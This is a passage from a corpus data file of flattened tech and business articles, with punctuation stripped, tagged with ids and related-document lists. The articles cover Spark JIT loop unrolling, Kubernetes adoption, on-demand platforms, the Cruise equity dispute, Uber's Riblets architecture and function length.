for the worst but thought we d make up for the change within two years due to increased volume  We made it up in six months    Ultimately  all businesses are transitional   we just can t predict precisely when or how  Businesses focused on optimizing what has worked for years at the expense of the future will create ever greater risk for their owners  employees  and customers  Experiment with potential transitional models so that your company is ready when the time is right  You can t lead the way if you re waiting for someone else to take the lead,"[809 281 1016 843 1086 673 572 1408 357 344 778]"
811,training-dataset/engineering/1183.txt,engineering,Processing a Trillion Rows Per Second on a Single Machine  How Can Nested Loop Joins be this Fast This blog post describes our experience debugging a failing test case caused by a cross join query running  too fast   Because the root cause of fail test case spans across multiple layers from Apache Spark to the JVM JIT compiler  we wanted to share our analysis in this post   Spark as a compiler  The vast majority of big data SQL or MPP engines follow the Volcano iterator architecture that is inefficient for analytical workloads  Since Spark 2 0 release  the new Tungsten execution engine in Apache Spark implements whole stage code generation  a technique inspired by modern compilers to collapse the entire query into a single function  This JIT compiler approach is a far superior architecture than the row at a time processing or code generation model employed by other engines  making Spark one of the most efficient in the market  Our earlier blog post demonstrated that Spark 2 0 was capable of producing a billion records a second on a laptop using its broadcast hash join operator   Spark 2 0 implemented whole stage code generation for most of the essential SQL operators  such as scan  filter  aggregate  hash join  Based on our customers  feedback  we recently implemented whole stage code generation for broadcast nested loop joins in Databricks  and gained 2 to 10X improvement   Mystery of a failing test case  While we were pretty happy with the improvement  we noticed that one of the test cases in Databricks started failing  To simulate a hanging query  the test case performed a cross join to produce 1 trillion rows   spark range 1000   1000  crossJoin spark range 1000   1000   count    On a single node  we expected this query would run infinitely or  hang   To our surprise  we started seeing this test case failing nondeterministically because sometimes it completed on our Jenkins infrastructure in less than one second  the time limit we put on this query   We noticed that in one of the failing instances  the query was performing a broadcast nested loop join using 40 cores  as shown below  That is to say  each core was able to process 25 billion rows per second  As much as we enjoyed the performance improvements  something was off  the CPU was running at less than 4 GHz  so how could a core process more than 6 rows per cycle in joins   Life of a Spark query  Before revealing the cause  let s walk through how Spark s query execution works   Spark internally represents a query or a DataFrame as a logical plan  The Catalyst optimizer applies both rule based peephole optimizations as well as cost based optimizations on logical plans  After logical query optimization  Catalyst transforms the logical plan into a physical plan  which contains more information about how the query should be executed  As an example   join  is a logical plan node  which doesn t dictate how the join should be physically executed  By contrast   hash join  or  nested loop join  would be a physical plan node  as it specifies how the query should be executed   Prior to whole stage code generation  each physical plan is a class with code defining the execution  With whole stage code generation  all the physical plan nodes in a plan tree work together to generate Java code in a single function for execution  This Java code is then turned into JVM bytecode using Janino  a fast Java compiler  Then JVM JIT kicks in to optimize the bytecode further and eventually compiles them into machine instructions   In this case  the generated Java code looked like the following  simplified for illustration    long agg_value1   0L  while  range_number    range_batchEnd    range_number    1L  for int bnlj_index   0  bnlj_index   broadcast length    bnlj_index    InternalRow row   broadcast bnlj_index   agg_value1    1L       Our first guess was that JVM JIT was smart enough to eliminate the inner loop  because JIT analyzed the bytecode and found the inner loop had no side effect other than incrementing some counters  In that case  JIT would rewrite the code into the following   long agg_value1   0L  while  range_number    range_batchEnd    range_number    1L  agg_value1    broadcast length     This would turn an operation that is O outer   inner  to just O outer   To verify this  we used the flag  XX PrintAssembly to dump the assembly code by JIT  and inspected the assembly code  A shortened version of the generated assembly looks like the following  annotation added by us  you can find the full version here    0x00007f4d0510fb6f  jne 0x00007f4d0510fc85  strong 0x00007f4d0510fb75  mov r10d DWORD PTR  rbx 0xc   r10d   bnlj_broadcast length 0x00007f4d0510fb79  mov r9d r10d  strong 0x00007f4d0510fb7c  add r9d 0xfffffff1   r9d   bnlj_broadcast length   15 0x00007f4d0510fb80  xor r8d r8d     0x00007f4d0510fba6  je 0x00007f4d0510fc4e 0x00007f4d0510fbac  add r13 0x1   outer loop increment 0x00007f4d0510fbb0  xor ebp ebp 0x00007f4d0510fbb2  cmp ebp r10d   inner loop condition 0x00007f4d0510fbb5  jge 0x00007f4d0510fb9b     0x00007f4d0510fbcd  mov r11d ebp 0x00007f4d0510fbd0  inc r11d   inner loop increment by 1 0x00007f4d0510fbd3  add r14 0x1   agg_value1 increment by 1 0x00007f4d0510fbd7  cmp r11d r10d   inner loop condition 0x00007f4d0510fbda  jge 0x00007f4d0510fb9b     0x00007f4d0510fc14  mov QWORD PTR  rcx 0x68  rdi 0x00007f4d0510fc18  add r14 0x10   agg_value1    16 0x00007f4d0510fc1c  add r11d 0x10   inner loop increment by 16 0x00007f4d0510fc20  cmp r11d r9d   inner loop condition    bnlj_index   bnlj_broadcast length   15 0x00007f4d0510fc23  jl 0x00007f4d0510fc10 0x00007f4d0510fc25  cmp r11d r10d   inner loop condition    bnlj_index   bnlj_broadcast length 0x00007f4d0510fc28  jge 0x00007f4d0510fb9b 0x00007f4d0510fc2e  xchg ax ax  The assembly is a bit verbose  but it is easy to notice that the agg_value1    1 instruction was implemented using both add 0x01 and add 0x10 assembly instructions  This suggests the inner loop was unrolled with a factor of 16  after which further optimizations were possible  Since bnlj_broadcast length might not be a multiple of 16  add 0x01 instructions are still needed to finish the loop   So what really happened was that the nested loops were rewritten as following   long agg_value1   0L  while  range_number    range_batchEnd    range_number    1L  for int bnlj_index   0  bnlj_index   broadcast length  bnlj_index    16    agg_value1    16L           What we learned and our takeaways  Mystery solved  Would this particular optimization matter in practice  Probably not  unless you are running a query that counts the output of cross joins   However  we found the experience and cause fascinating and wanted to share with the curious  Without implementing a specific optimization rule to unroll the inner loop  we gained this optimization because it existed in another layer of abstraction  namely JVM JIT  Another interesting takeaway is that with multiple layers of optimizations  performance engineering can be quite challenging  and extreme care must be taken when designing benchmarks to measure the intended optimization  as optimizations in other layers might bring unexpected speedups and lead to incorrect conclusions   The broadcast nested loop join improvement is  nonetheless  generally applicable  and all Databricks customers will automatically get this optimization in the next software update,"[811 276 884 1295 1217 669 206 1235 1409 713 1403]"
830,training-dataset/engineering/1262.txt,engineering,Why Kubernetes is Foundational for Fortune 500 Digital Transformation  and the Cloud Infrastructure Management Landscape Why Kubernetes is Foundational for Fortune 500 Digital Transformation  and the Cloud Infrastructure Management Landscape  By Vipin Chamakkala About 18 months ago  tech publications began overflowing with news on containers and how they would radically transform enterprise IT  We set out to distill the hype in this new market by putting together a new series on our blog aptly called  The State of the Container   Based on our research  it became clear that this was a real market trend and represented a once in a decade transformation in enterprise infrastructure that would reshape the entire IT industry  It was apparent that the container and application layer were only the beginning  and we began investigating where the gaps were   in areas like security  networking  management  and orchestration   to see where we could support the next generation of innovators  We spoke to more than one hundred corporate executives and founders focused on bringing a tidal wave of innovation to the enterprise IT stack  while making two investments along the way  CoreOS   Cockroach Labs  With more of the recent buzz building around Kubernetes  we wanted to take a moment to compare the pros and cons of other platforms  and why we believe Kubernetes will be crown jewel of container orchestration  A Little History In the not too distant past  virtualization ruled the world  Runbooks and deployment scripts were used to automate application delivery in large enterprises  Often prone to human error  a crop of configuration management tools sprouted up to address these problems in complex Fortune 500 enterprise development environments  But then  as we all know  software ate the world  At this point  the internet giants of today like Google  Netflix  and Facebook were all already using containers and a microservices architecture  where small modular components modeled around specific business functions work together   enabling developers to continuously deliver new products  features  and enhancements at scale  The Fortune 500 continued to build with proprietary software stacks supported by large centrally controlled teams  often spending months to deliver new features and products  while spending significantly more to do so than their webscale counterparts  Not only is enterprise application architecture extremely complex  but it s also exceedingly difficult to scale on demand  Unlike a distributed  cloud based microservices architecture  the normal utilization rate of an enterprise datacenter is usually about only 20    a wasteful  frustrating  and expensive problem  While Fortune 500 executives initially envied the datacenter operational expenditure enjoyed by internet companies  another huge business benefit was the speed at which webscale companies were delivering solutions for customers  partners  and employees  Datacenter utilization and product agility become game changers at scale  and the Fortune 500 realized the need for digital transformation  Which Brings Us To Today Now  almost every Fortune 500 is transforming into a software based business in an effort to compete in rapidly changing markets  Having fully realized the enterprise use cases for microservices  Fortune 500 executives know that agile development practices and containers are key to this digital transformation  However  the container format itself is just the beginning   a building block that has been largely commoditized  The foundational piece that remains key for Fortune 500 adoption is container management  and the battle is on for market share  The following is our evaluation of such systems relevant to the cloud infrastructure management ecosystem  as well as some additional background on each  Cloud Foundry  Cloud Foundry is an open source cloud computing Platform as a Service  PaaS   Originally developed by VMware and now owned by Pivotal Software   a joint venture by EMC  VMware  and General Electric  Cloud Foundry supports the full lifecycle  from initial development  through all testing stages  to deployment  It is therefore well suited to the continuous delivery strategy but is not container centric in its approach   OpenStack  OpenStack began in 2010 as a joint project of Rackspace Hosting and NASA  It s a free and open source platform for cloud computing  deployed as an Infrastructure as a Service  IaaS  solution  OpenStack consists of a set of control panel APIs with software that allows companies to deploy VMs and other software defined infrastructure environments in their own datacenter  While valuable in being able to simplify heterogeneous enterprise development environments  OpenStack is often criticized for being extremely difficult to install  However  as demo d recently  Openstack works really well with Kubernetes  making it as simple as installing any application running on Kubernetes  which in turn provides enterprises the benefits of both containers and virtualization based IaaS   Docker Swarm  Docker Swarm is native container clustering for Docker  turning a pool of Docker hosts into a single  virtualized host  Docker s new release includes a its own orchestration system named SwarmKit  which adds container management built right into the Docker container format  This brings developers a simple and easy way to manage containers but it still has a way to go to be ready for production  From a community perspective  Swarm is ultimately controlled by a single startup and not supported by an open source community  which adds some risk down the line  Solutions like Mesos and Kubernetes  below  provide more robust feature sets that appeal to larger enterprises   Apache Mesos  Mesos is a open source software originally developed at the University of California at Berkeley  It sits between the application layer and the operating system and makes it easier and more efficient to deploy and manage applications in large scale clustered environments  Mesos  core is a generic scheduling system  but it integrates well with other schedulers  This enables systems like Hadoop and Marathon to work well together  Mesos is less focused on running containers because of its roots in scientific computing  It existed before the extreme interest in containers and has been re based in areas to provide better container support   Kubernetes  Kubernetes was designed from the ground up to be the ideal platform to build  manage  and orchestrate distributed applications using containers  It includes primitives for replication and service discovery as part of its core  these are added via frameworks in Mesos and requires some know how to configure properly  and the vision for Kubernetes is to develop a system that allows enterprises to manage scalable application deployments with maximum efficiency  security  and ease  Looking Forward With the enterprise use cases in place  Fortune 500 companies are now looking to move beyond  Docker science projects   They are taking the next step by evaluating the replacement of legacy systems with the aforementioned solutions  Many are deploying several of these together  siloed by teams and use cases  An important word of caution  operating these systems in parallel will create significant hurdles in the future that will lead to serious cost  When considering the management  security  support  and human expertise required for each of these platforms   as well as being dependable and efficient on top of that   it easily becomes an operational nightmare to manage them all  Forward thinking organizations have realized that Mesos and Kubernetes are the best platforms to abstract and pool datacenter resources  What makes Kubernetes stand apart from Mesos and all the other offerings here is largely due to the open source community that is forming around it  driving its open integration with other key infrastructure components  like Soundcloud s Prometheus and CoreOS s etcd  to form a multi vendor supported enterprise stack  The reason for this  according to Apprenda executive Chris Gaun  is that Kubernetes provides a  very strong ecosystem that mimics the Hadoop model   In this model  Hadoop became a success because it wasn t dominated by a single large vendor  Most of the other infrastructure platforms covered in this post are largely managed under the direction of one  or several large vendors  and they do not play nicely with other open source components  As described by Accel at a recent Open Source event at Work Bench  they lack the requisite open source communities  network of contributors  and frontline developers and customers to become foundational technologies embraced by the masses  Kubernetes  explosive growth  on the other hand  follows this notion of community adoption  Furthermore  Kubernetes builds on 15 years of experience of running cloud infrastructure production workloads at Google  while also combining it with best of breed ideas and practices from its growing community of contributors and companies that are actively adding critical features  The Kubernetes community has been laying down a solid foundation for running distributed infrastructure at enterprise scale  while teams from companies like CoreOS have been busy combining Kubernetes with other powerful open source technologies to help businesses run containers with enterprise grade security  reliability and support  Although it may seem like these companies are all vying for a slice of the pie  it s unlikely to become a winner takes all situation as we ve seen in the past with IT disruptions  and these platforms will evolve to support different scenarios for different customers  It will be fascinating to see how all of this plays out in the enterprise over the next few years  and we continue to be extremely impressed with each new Kubernetes release  Please enable JavaScript to view the comments powered by Disqus  comments powered by Disqus,"[830 1192 92 935 1297 695 1373 899 234 773 251]"
843,training-dataset/business/713.txt,business,Why Many On Demand Platforms Fail   The MacroSam Madden  cofounder of PocketSuite  W16   shares his perspective on on demand models within service industries   Due to the extraordinary success of Uber there is a school of thought among the tech community that every service can be Uberized  However  when it comes to home and local services  the Uber model tends to break down   The most successful on demand companies have had models focused around commodity services   think transportation  Uber  and delivery  Postmates   These are types of services where the range in service quality isn t large and the trust requirement isn t high  Most of us are not too worried about who will drive us from A to B  or who will deliver our Indian food on a Sunday night  We just want our service performed immediately and in a convenient way   When Trust is Paramount  Home services are different  It takes a much larger amount of trust to allow a service professional  or  pro   into your home let alone take care of your pet  or babysit your child   Typically the preliminary pain point in home services hiring is finding the right pro who you like  who you trust  and who does great work  Once you find that pro  you don t want to let him or her go  You want to keep them in your pocket  and reach out to them whenever you re in need   in your own on demand way   The Uber model tends to break down in service industries where direct client pro relationships are traditionally formed   Direct Relationships Matter  As consumers  we re not the only ones who feel this way  The home service pros themselves are on the exact same page as us   What service pro wouldn t want to keep a rolodex of regular clients  or be accessible for on demand booking from high paying clients  or even set their clients up on recurring appointment schedules   Having a direct relationship with one s client is crucial when gauging cash flow visibility  and also cheaper from a customer acquisition standpoint   much easier to convert a past client than win a new one   No Scale with a Middleman  In addition  operating under an  Uber as boss  model prevents an eager service pro from scaling his or her business  The fees these pros pay on demand platforms to act as middlemen range from 20 30  per client transaction   for each and every transaction  The dream of hiring contractors or employees becomes uneconomical if the amount a pro is pulling in at the get go is net of a 20 30  fee for every single job   The Future of Work  Consumers are increasingly expecting Uber like technology and convenience when they do anything these days  On demand platforms have been the first mover to try to capture this technology shift in consumer demand  and many companies have seen successes in a variety of service industries   The future of work within the home and local service economy goes deeper than what on demand platforms currently offer  Technology helping with initial pro discovery is one thing  but empowering the ongoing direct relationship between professional and client is going to be the next huge wave in platform creation within the  800 billion home services economy   Sign up for weekly recaps of The Macro,"[843 1351 281 1016 809 952 1086 673 778 1408 61]"
871,training-dataset/business/180.txt,business,Sam AltmanThere is a long and sordid history of people coming out of the woodwork with bogus claims when huge amounts of money are on the line  This has just happened to Cruise  which is run by my friend Kyle Vogt  Cruise is a YC company  and I also personally invested in the company last year   As detailed in a complaint filed by Kyle and Cruise  Jeremy Guillory collaborated with Kyle for a very short period early on in the life of Cruise  I know that at least Kyle had been thinking about autonomous vehicles for quite some time  and I assume Jeremy had been too given all of the attention on the topic in the press about Google s activities  After a little over a month  Kyle and Jeremy parted ways  This event happened more than two years ago  and well before the company had achieved much of anything   There is more detail in this footnote  1  if you re curious  or you can read the complaint online here   Jeremy is now claiming to Kyle that he should own a substantial amount of Cruise s equity  and by doing so is interfering with the pending Cruise GM merger   Kyle made an extremely generous offer to settle this claim by offering to give Jeremy a lot of his own money   2  In my opinion  Jeremy s claim is completely baseless and opportunistic it obviously comes at a bad time for the company with the merger still pending  and Kyle understandably wanted to avoid a protracted litigation  Kyle has worked incredibly hard to settle this claim amicably  despite what I consider to be the obvious ridiculousness of it  and has done far more than I would have personally done under these circumstances   Kyle and Cruise are now suing Jeremy for making a false equity claim  It s an incredible bummer these situations have to happen in the first place  This is one of the least sensible professional situations I ve ever been involved with  but unfortunately these situations are not uncommon   I recognize that I place myself at risk talking about this  but it s time that someone speaks publicly about situations like what is happening at Cruise  And so I ve decided to say something before the lawyers can stop me  Even with this issue  both sides still expect the merger to close on schedule in Q2        1  Kyle and Jeremy applied to YC together but Jeremy left before the YC interview  Neither took a salary  and Kyle was funding the company by himself at that point   According to Kyle  Jeremy did not write any code or build any hardware during this exploratory period  He did help find an office for the company  At the point of Jeremy s departure  neither he nor Kyle had signed employment agreements  stock agreements  or any documents of any sort with the company  Even if Jeremy had signed a stock agreement  he wouldn t have reached the standard 1 year cliff for founders to vest any equity   Kyle told me that Jeremy would occasionally reach out to congratulate him on press about Cruise  for example  he reached out to congratulate Kyle on Cruise s Series A   but he never asked for anything until now  when  in my opinion  he saw an opportunity to make a ton of money    2  I was personally involved all day on Friday last week to try to help settle this claim  Given the time pressure because of the pending merger  we had to set a Friday at 5 pm deadline for Kyle s offer  which Jeremy let expire,"[871 757 778 1373 712 1086 806 281 683 795 15]"
875,training-dataset/engineering/100.txt,engineering,Engineering the Architecture Behind Uber s New Rider Appby Vivian Tran   Yixin Zhu  Why Uber Started Over  Uber is based on a simple concept  push a button  get a ride  What started as a way to request premium black cars now offers a range of products  coordinating millions of rides per day across hundreds of cities  We needed to redefine our mobile architecture to reflect and support that reality for 2017 and the future beyond   But where to begin  Well  we went back to where we started in 2009  with nothing  We decided to completely rewrite and redesign our rider app  Not being held back by our extensive codebase and previous design choices gave us the freedom where we otherwise would have made compromises  The outcome is the sleek new app you see today  which implements a new mobile architecture across both iOS and Android  Read on to learn why we felt the need to create this new architecture pattern  called Riblets  and how it helps us reach our goals   Motivations  Where To   While connecting riders to on demand transportation remains the driving idea behind Uber  our product has evolved into something much bigger  and our original mobile architecture just couldn t keep up  Engineering challenges and technical debt accumulated over years as we stretched the rider app to fit new features  Additions such as uberPOOL  scheduled rides and promotional vehicle views introduced complexity  Our trip module grew large  becoming hard to test  Incorporating small changes ran the chance of breaking other parts of the app  making experimentation fraught with collateral debugging  inhibiting our pace for future growth  To maintain the high quality Uber experience for all users  we needed a way to recapture the simplicity of where we started  while accounting for where we are today and where we want to go in the future   The new app had to be simple for riders as well as Uber engineers  who develop improvements and features daily  To rewrite the app for these distinct groups  our two main goals became increasing the availability of our core rider experience  and allowing for radical experimentation within a set of product rails   Reliability is Core  From the engineering side  we re striving to make Uber reliability a reality 99 99  of the time for our core rider experience  Achieving 99 99  availability means we can have just one cumulative hour of downtime a year  one minute of downtime a week  or one failure per 10 000 runs   To get us there  the new architecture defined and implemented a framework of core and optional code  Core code everything needed to sign up  take  complete  or cancel a trip must run  Changes and additions to core code go through a stringent review process  Optional code undergoes less stringent review and can be turned off without stopping Uber s core business  This encouragement of code isolation allows us to try out new features and automatically turn them off if they aren t working correctly  without interfering with the ride experience   Rails for the Future  We need a platform from which a hundred different program teams and thousands of engineers can build quality features quickly and innovate on top of the rider app without compromising the core experience  So we gave our new mobile architecture cross platform compatibility  where both iOS and Android engineers can work on a unified ground   Historically  shipping the best app on iOS and Android involved divergent approaches to architecture  library design  and analytics  The new architecture  however  is committed to using the same best patterns and practices across both platforms  This enables us to capitalize on the learning opportunities from both platforms  Instead of making the same mistake twice because we have separate teams for each platform  the lessons from one platform can preemptively solve issues on the other  Thus  iOS and Android engineers can collaborate more easily and work on new features in parallel   While there are instances where the platforms can and should diverge  e g   UI implementation   both iOS and Android mobile platforms start from a consistent place  The platforms share   Core architecture  Class names  Inheritance relationships between business logic units  How business logic is divided  Plugin points  names  existence  structure  etc    Reactive programming chains  Unified platform components  In order to achieve this common blueprint between platforms  our new mobile architecture required clear organization and separation of business logic  view logic  data flow  and routing  Such an architecture helps defeat complexity  simplify testability  and therefore increase engineering productivity and user reliability  We innovated on other architectural patterns to achieve this   From MVC to Riblets  With our two goals in mind  we examined where our old architecture could be improved and investigated the options for moving forward  The codebase we inherited from Uber s beginnings followed the MVC pattern  We looked into other patterns  particularly VIPER  which we eventually used to create Riblets  The core innovation with Riblets is that routing is guided by business logic as opposed to view logic  If you re unfamiliar with MVC and VIPER  read some articles on modern iOS architecture patterns  then come back to see the pros and cons of adopting them at Uber   Where We Started  MVC  Model View Controller   The previous rider app was created almost four years ago by a handful of engineers  While the MVC pattern made sense then  it s unmanageable at scale  As our previous rider app and the team working on it grew to a few hundred people  we saw firsthand how MVC couldn t grow with us  Specifically  there were two big problem areas   First  matured MVC architectures often face the struggles of massive view controllers  For instance  the RequestViewController  which started off as 300 lines of code  is over 3 000 lines today due to handling too many responsibilities  business logic  data manipulation  data verification  networking logic  routing logic  etc  It has become hard to read and modify   Secondly  MVC architectures have a fragile update process with a lack of testing  We experiment a lot to roll out new features to our users  These experiments boil down to if else statements  Whenever there s a class with many functionalities  the if else statements build on top of each other  making it near impossible to reason about  let alone test  Additionally  as integral pieces of code like the RequestViewController and TripViewController grew huge  making updates to the app became a fragile process  Imagine making a change and testing every possible combination of nested if else experiments  Since we need experiments to continue to add new features and grow Uber s business  this kind of architecture isn t scalable   Along the Way  VIPER  When considering alternatives to MVC  we were inspired by the way VIPER could be used as an application of Clean Architecture to iOS apps  VIPER offers a few key advantages to MVC  First  it offers more abstraction  The Presenter contains presentation logic that glues business logic with view logic  The Interactor handles purely data manipulation and verification  This includes making service calls to the backend to manipulate state  such as sign in and request a trip  And finally  the Router initiates transitions  such as taking the user from home to confirmation screen  Secondly  with the VIPER approach  the Presenter and Interactor are plain old objects  so we can use simple unit tests   But we also found some downsides with VIPER  Its iOS specific construct meant we d have to make tradeoffs for Android  Its View driven application logic means the application states are driven by views  since the entire application is anchored on the view tree  The business logic performed by the Interactor that s supposed to manipulate application states always has to go through the Presenter  therefore  leaking business logic  And finally  with the tightly coupled view tree and business tree  it s difficult to implement a node that contains only business logic or only view logic   While VIPER offers significant improvements to the MVC pattern we were using  it doesn t fully meet Uber s needs and goals for a scalable platform with clear modularity  So we went back to the drawing board to see how we could develop an architecture pattern that grabs the benefits of VIPER  while accommodating for the cons as well  Our result was Riblets   Riblets  Uber s Rider App Architecture  In our new architecture pattern  the logic is similarly broken into small  independently testable pieces that each have a single purpose  following the single responsibility principle  We use Riblets as these modular pieces  and the entire application is structured as a tree of Riblets   Riblets and Their Components  With Riblets  we delegated responsibilities to six different components to further abstract business and view logic   What distinguishes Riblets from VIPER and MVC  Routing is guided by business logic rather than view logic  This means the application is driven by the flow of information and decisions being made  rather than the presentation  At Uber  not every piece of business logic is related to a view that the user sees  Instead of lumping the business logic into a ViewController in MVC or manipulating application states through the Presenter in VIPER  we can have distinct Riblets for each piece of business logic  giving us logical groupings that make sense and are easy to reason about  We also designed the Riblet pattern to be platform agnostic to unify Android and iOS development going forward   Each Riblet is made up of one Router  Interactor  and Builder with its Component  hence the name   and optional Presenters and Views  The Router and Interactor handle the business logic  while the Presenter and View handle the view logic   Let s start by establishing what each of these Riblet units is responsible for  using the Product Selection Riblet as an example   Builder  The Builder instantiates all primary Riblet units and defines dependencies  In the Product Selection Riblet  this unit defines the city stream  a data stream for a particular city  dependency   Component  The Component obtains and instantiates a Riblet s dependencies  This includes services  data streams  and everything else that isn t a primary Riblet unit  The Product Selection Component obtains and instantiates the city stream dependency  hooks it up to the appropriate network events  and injects it into the Interactor   Routers  Routers form the application tree by attaching and detaching child Riblets  These decisions are passed by the Interactor  Routers also drive the Interactor lifecycle by activating and deactivating them at certain state switches  Routers contain two pieces of business logic   Helper methods for attaching and detaching Routers State switching logic for determining states between multiple children  The Product Selection Riblet doesn t have any child Riblets  The Router of its parent Riblet  the Confirmation Riblet  is responsible for attaching the Product Selection s Router and adding its View to the View hierarchy  Then  once a product has been selected  the Product Selection Router deactivates its Interactor   Interactors  Interactors perform business logic  This includes  for example   Making service calls to initiate actions  like requesting a ride  Making service calls to fetch data  Determining what state to transition to next  For instance  if the root Interactor notices that a user s authentication token is missing  it sends a request to its Router to switch to the  Welcome  state   The Product Selection Interactor takes a city stream containing data including service offerings in that city  pricing information  estimated travel time  and vehicle views  It passes this information to the Presenter  If the user clicks from uberPOOL to uberX  the Interactor receives this information from the Presenter  It then collects the relevant data to pass back to the View so it can display uberX vehicles and estimated pick up time  In short  the Interactor performs all the business logic that is then presented in the View   View  Controller   Views build and update the UI  including instantiating and laying out UI components  handling user interaction  filling UI components with data  and animations  The view for the Product Selection Riblet displays the objects it receives from the Presenter  product options  pricing  ETAs  vehicle views on the map  and passes back user actions  i e   the product selection    Presenter  Presenters manage communication between Interactors and Views  From Interactors to Views  the Presenter translates business models into objects that the View can display  For Product Selection  this includes pricing data and vehicle views  From Views to Interactors  Presenters translate user interaction events  such as tapping a button to select a product  into appropriate actions in Interactors   Putting the Pieces Together  Riblets only have a single Router and Interactor pair  but they can have multiple view parts  Riblets that only handle business logic and don t have user interface elements don t have the view part  Riblets can thus be single view  one Presenter and one View   multi view  either one Presenter and multiple Views  or multiple Presenters and Views   or viewless  no Presenter and no View   This allows the business logic tree structure and depth to be different from the view tree  which will have a flatter hierarchy  This helps simplify screen transitions   For example  the Ride Riblet is a viewless Riblet that checks whether a user has an active trip  If the rider does  it attaches the Trip Riblet  which will show the trip on a map  If not  it attaches the Request Riblet  which will show the screen to allow users to request a trip  Such Riblets like the Ride Riblet without view logic serve an important function by breaking up the business logic that drives our applications  upholding the modular aspect of this new architecture   How Riblets Build the Application  Riblets make up the application tree and often need to communicate in order to update information or take users to the next stage in getting a ride  Before we go into how they communicate  let s first understand how data flows within one Riblet   Data flow within a Riblet  Interactors own the state for their scope and the business logic that drives the application  This unit makes service calls to fetch data  In the new architecture  data flows in one direction  It goes from service to model stream and then from model stream to Interactor  Interactors  schedulers  and push notifications from the network can ask services to make changes to the model stream  The model stream produces immutable models  This enforces the requirement that the Interactor classes must use the service layer to make changes to the application s state   Example flows   From a backend service to the View   A service call  like status  fetches data from the backend  This places the data on an immutable model stream  An Interactor listening to this stream notices the new data and passes it to the Presenter  The Presenter formats the data and sends it to the View   From the View to the backend  The user taps on a button  like sign in  and the View passes the interaction to the Presenter  The Presenter calls a sign in method on the Interactor that results in a service call to actually sign in  The token that s returned is published on a stream by the service  An Interactor listening to the stream switches to the Home Riblet   Communication between Riblets  When an Interactor makes a business logic decision  it may need to inform another Riblet of events  e g   completion  and send data  To achieve this  the Interactor making the business logic decision invokes an interface that s conformed to by the Interactor of another Riblet   Typically  if communication is going up the Riblet tree to a parent Riblet s Interactor  the interface is defined as a listener  The listener is almost always implemented by the parent Riblet s Interactor  If communication is downward to a child Riblet  the interface should be defined as a delegate  and implemented by the child Riblet s Interactor  Delegates are only meant for synchronous direct communications between Riblet units  such as a parent Interactor to a child Interactor   Specifically for downward communication  the parent Riblet can choose to expose an observable data stream to the child Riblet s Interactor  The parent Riblet s Interactor can then send data to the child Riblet Interactor via this stream  as an alternative to the delegate approach  In most downward communication for sending data  this should be the preferred method of communication   For example  when a hypothetical ProductSelectionInteractor determines a product has been selected  it invokes its listener to pass the selected vehicle view ID  The listener is implemented by a ConfirmationInteractor  The ConfirmationInteractor then stores the vehicle view ID so it can be sent in a service request  invokes its Router to detach  and dismisses the ProductSelection Riblet   By structuring data flow within and between Riblets in this way  we ensure that the right data comes at the right time on the right screen  Because Riblets form the application tree based on business logic  we can route communication through business logic  rather than view logic   This makes sense for our business and also ultimately helps encourage code isolation  keeping app development from growing too complex   Back to the Starting Point  When we set out to start over on the rider app from scratch  we wanted to refocus on the core rider experience by increasing the app s reliability and establish the right set of rails for future app development  Creating the new architecture was essential to achieving these two goals   How did we increase availability for the core rider experience   Riblets have clear separation of responsibilities  so testing is more straightforward  Each Riblet is independently testable  With better testing  we can be more confident in the reliability of our rider app when we roll out updates  Since each Riblet serves a single responsibility  it was easy to separate Riblets and their dependencies into core  directly needed to sign up and take an uberPOOL or uberX ride  and optional code  By demanding more stringent review for core code  we can be more confident in the availability of our core flows   We also enabled global roll back of core flows to a guaranteed working state  All optional code is under master feature flags that can be turned off if parts of it are buggy  In the worst case scenario  we can turn off every piece of optional code and default to just the core flow  Since we have such a high bar on core code  we ensure that our core flows are always working   How did we establish the right set of rails for future rider app development   Riblets help us narrow and decouple functionality as much as possible  This clarity in the separation of business and view logic will help prevent our codebase from growing overly complex and keep it easy to work out of  Since the new architecture is platform agnostic  iOS and Android engineers can easily understand how the other is developing  learn from one another s mistakes  and work together to push Uber forward  Experimentation will be less prone to collaterally affect the core experience since Riblets help us separate optional code from core code  We ll be able to try out new features  developed as plugins in the Riblet architecture  without worrying that they might accidentally put the uberX and uberPOOL experiences at risk of bugs   Since Riblets have heightened abstraction and separation of responsibilities  and with a clearly defined path for data flow and communication  continuing development is easy this architecture will serve us for years to come   Ready to Move Forward  Our new architecture positions us for the road s  ahead  This latest rewrite meant completely redoing the rider app s codebase  reimplementing what previously existed  performing user research  case studies  A B tests  and writing new features like the feed  On top of this  we wanted to do a global rollout to put the new app in the hands of our users faster  so we accounted for variations around the world from design  features  localization  devices  and testing perspectives  Though the launch is over  the work under our new architecture is just beginning   There s a plethora of possibilities to develop under this new architecture improving the new rider feed  expanding this architecture to the driver and UberEATS apps  and even building for the builders  In fact  we spent a couple months building prototypes to make sure we were making the right tradeoffs  Now we could feel confident we got the architecture right for plenty of building ahead  If this kind of work excites you  come be part of this story and improve the Uber experience for everyone through Android and iOS engineering   Vivian Tran wrote this article with Yixin Zhu  the Uber Engineering technical program manager who oversaw the release of the new rider app,"[875 673 952 1300 1351 281 1086 1016 606 61 234]"
884,training-dataset/engineering/900.txt,engineering,FunctionLengthtags   During my career  I ve heard many arguments about how long a function should be  This is a proxy for the more important question   when should we enclose code in its own function  Some of these guidelines were based on length  such as functions should be no larger than fit on a screen  1   Some were based on reuse   any code used more than once should be put in its own function  but code only used once should be left inline  The argument that makes most sense to me  however  is the separation between intention and implementation  If you have to spend effort into looking at a fragment of code to figure out what it s doing  then you should extract it into a function and name the function after that  what   That way when you read it again  the purpose of the function leaps right out at you  and most of the time you won t need to care about how the function fulfills its purpose   which is the body of the function   Once I accepted this principle  I developed a habit of writing very small functions   typically only a few lines long  2   Any function more than half a dozen lines of code starts to smell to me  and it s not unusual for me to have functions that are a single line of code  3   The fact that size isn t important was brought home to me by an example that Kent Beck showed me from the original Smalltalk system  Smalltalk in those days ran on black and white systems  If you wanted to highlight some text or graphics  you would reverse the video  Smalltalk s graphics class had a method for this called  highlight   whose implementation was just a call to the method  reverse   4   The name of the method was longer than its implementation   but that didn t matter because there was a big distance between the intention of the code and its implementation   Some people are concerned about short functions because they are worried about the performance cost of a function call  When I was young  that was occasionally a factor  but that s very rare now  Optimizing compilers often work better with shorter functions which can be cached more easily  As ever  the general guidelines on performance optimization are what counts  Sometimes inlining the function later is what you ll need to do  but often smaller functions suggest other ways to speed things up  I remember people objecting to having an isEmpty method for a list when the common idiom is to use aList length    0   But here using the intention revealing name on a function may also support better performance if it s faster to figure out if a collection is empty than to determine its length   Small functions like this only work if the names are good  so you need to pay good attention to naming  This takes practice  